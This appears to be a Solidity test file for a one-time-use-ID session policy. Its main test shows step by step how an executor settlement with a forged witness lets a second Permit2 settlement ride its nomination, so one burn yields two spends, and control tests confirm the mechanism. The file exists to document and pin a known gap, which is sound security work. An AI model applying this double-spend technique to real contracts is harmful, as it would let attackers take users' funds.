// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { OneTimeUseIdE2E_Base } from "./OneTimeUseIdMatrixE2E.integration.t.sol";
import { IOneTimeUseIdPolicy } from "@policies/onetime/interfaces/IOneTimeUseIdPolicy.sol";
import { ActionData, PolicyData } from "@types/DataTypes.sol";
import { MockAdapter } from "@mocks/MockAdapter.sol";
import { Execution } from "modulekit/integrations/ERC7579Exec.sol";
import { MockTarget } from "@rhinestone/compact-utils/src/tests/MockTarget.sol";
import { SmartExecutionLib } from "@compact-utils/common/SmartExecutionLib.sol";
import { Types } from "@compact-utils/types/OrderTypes.sol";
import {
    IStandaloneIntentExecutor
} from "@compact-utils/executor/interfaces/IStandaloneIntent.sol";

/// @title The executor route CAN nominate, and that is a build requirement
/// @notice Nothing on-chain stops an executor settlement from calling `consumeFor` and nominating
///         a Permit2 nonce it does not own. A Permit2 settlement that then skips its own burn
///         rides that nomination — one burn, two settlements.
///
///         A `checkAction` ban used to sit here and was removed, because it never ran: a
///         permissive `FALLBACK_ACTIONID` routes `consumeFor` around any guard on that surface,
///         and even the strict install below reaches it only because this file registers
///         `consumeFor` explicitly. A guard that reads as protection while never executing is
///         worse than its absence.
///
///         What actually excludes this: the orchestrator composes the settlement's ops, and the
///         ops are inside the signed digest. See WHO IS TRUSTED on the policy. These tests pin
///         the gap so nobody mistakes it for closed.
contract OneTimeUseIdWitnessForgery_Test is OneTimeUseIdE2E_Base {
    using SmartExecutionLib for *;

    /// @dev `consumeFor` is reachable from the action route only if the session registers it.
    ///      A real install would reach it via a permissive `FALLBACK_ACTIONID` instead; this is
    ///      the narrowest shape that exercises the same path.
    function _extraActions(PolicyData[] memory actionPolicies)
        internal
        view
        override
        returns (ActionData[] memory extra)
    {
        extra = new ActionData[](1);
        extra[0] = ActionData({
            actionTarget: address(oncePolicy),
            actionTargetSelector: IOneTimeUseIdPolicy.consumeFor.selector,
            actionPolicies: actionPolicies
        });
    }

    function _nonceBurned(uint256 nonce) internal view returns (bool) {
        return (env.permit2.nonceBitmap($intent.sponsor, nonce >> 8) >> (nonce & 0xff)) & 1 == 1;
    }

    /// @dev An executor settlement whose consume nominates SOMEONE ELSE'S settlement
    function _settleViaExecutorNominating(uint256 executorNonce, uint256 forgedWitness) internal {
        Execution[] memory calls = new Execution[](2);
        calls[0] = Execution({
            target: address(oncePolicy),
            value: 0,
            callData: abi.encodeCall(IOneTimeUseIdPolicy.consumeFor, (ID, forgedWitness))
        });
        calls[1] = Execution({
            target: address(env.target),
            value: 0,
            callData: abi.encodeCall(MockTarget.targetFn, (42))
        });

        IStandaloneIntentExecutor.SingleChainOps memory signedOps;
        signedOps.account = env.smartAccount1.account;
        signedOps.nonce = executorNonce;
        signedOps.ops = SmartExecutionLib.SigMode.EMISSARY_EXECUTION.encode(calls);
        signedOps.signature = _emissarySig();

        vm.prank(env.solver.addr);
        env.intentExecutor.executeSinglechainOps(signedOps);
    }

    /// @dev A Permit2 claim with a starved pre-claim, so it performs no burn of its own
    function _prepareStarved() internal returns (bytes memory) {
        Types.Order memory order = _getPermit2Order();
        order.packedGasValues = Types.packGasValues(0, 0);
        $intent.userEmissarySig = _createSmartSessionSignature(_createPolicyData());

        return abi.encodeCall(
            MockAdapter.mock_permit2_handleClaim,
            (MockAdapter.ClaimDataPermit2({
                    order: order, userSigs: Types.Signatures($intent.userEmissarySig, "")
                }))
        );
    }

    /// @dev THE gap, end to end. An executor settlement burns the id while nominating Permit2
    ///      nonce 4242, which it does not own. A Permit2 settlement on 4242 with a starved
    ///      pre-claim then performs NO burn of its own — and settles anyway, on the nomination
    ///      the executor left behind. One burn, two settlements.
    ///
    ///      This is not a refusal test. It asserts the hole is open, because it is, and because
    ///      the thing that closes it is off-chain. An earlier version of this test asserted a
    ///      refusal and passed on `NoPoliciesSet` — `checkAction` appeared zero times in the
    ///      trace — which is how the gap survived a round of review.
    function test_theExecutorRouteCanNominateASettlementItDoesNotOwn() public {
        _enableSession(true);
        _useNonce(4242);

        _settleViaExecutorNominating({ executorNonce: 0, forgedWitness: 4242 });
        assertTrue(_burned(), "the executor settlement burned the id, once");

        bytes memory cd = _prepareStarved();
        _claim(block.chainid, abi.encodePacked(env.solver.addr), cd);

        assertTrue(
            _nonceBurned(4242),
            "and a Permit2 settlement that burned NOTHING rode the nomination: two spends"
        );
    }

    /// @dev The same attack with the witness NOT matching is refused, so the settlement above
    ///      really did ride the nomination rather than settle for some unrelated reason.
    function test_control_aNominationNamingAnotherSettlementIsNoHelp() public {
        _enableSession(true);
        _useNonce(4242);

        _settleViaExecutorNominating({ executorNonce: 0, forgedWitness: 9999 });
        assertTrue(_burned(), "burned, but nominating a settlement that never comes");

        bytes memory cd = _prepareStarved();

        vm.expectRevert();
        _claim(block.chainid, abi.encodePacked(env.solver.addr), cd);

        assertFalse(_nonceBurned(4242), "no matching nomination, no second spend");
    }

    /// @dev With NO executor settlement first, there is no nomination to ride and the starved
    ///      Permit2 settlement refuses. This is the second half of the attack in isolation: it
    ///      shows the starved settlement has no path of its own, so the spend above came entirely
    ///      from the borrowed nomination.
    function test_aStarvedPermit2SettlementHasNoNominationToRide() public {
        _enableSession(true);
        _useNonce(4242);

        bytes memory cd = _prepareStarved();

        vm.expectRevert();
        _claim(block.chainid, abi.encodePacked(env.solver.addr), cd);

        assertFalse(_nonceBurned(4242), "nothing settled");
    }

    /// @dev CONTROL. The executor route's PLAIN burn — which nominates nothing — still works.
    function test_control_theExecutorRouteMayStillBurn() public {
        _enableSession(true);

        _settleViaExecutor(0);

        assertTrue(_burned(), "a plain burn is what the action route is for");
    }
}
